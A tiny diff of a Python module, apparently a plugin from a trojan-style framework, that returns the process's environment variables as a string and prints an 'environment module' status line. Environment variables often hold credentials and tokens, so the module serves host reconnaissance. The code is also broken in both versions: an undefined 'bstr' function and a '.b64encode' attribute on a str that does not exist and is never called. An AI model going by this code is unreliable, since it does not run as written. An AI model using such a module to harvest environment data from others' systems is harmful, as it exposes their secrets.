@@ -1,4 +1,4 @@
 import os
 def run (**args):
 	print (" [*] In environment module.")
-	return bstr(os.environ)
+	return str(os.environ).b64encode
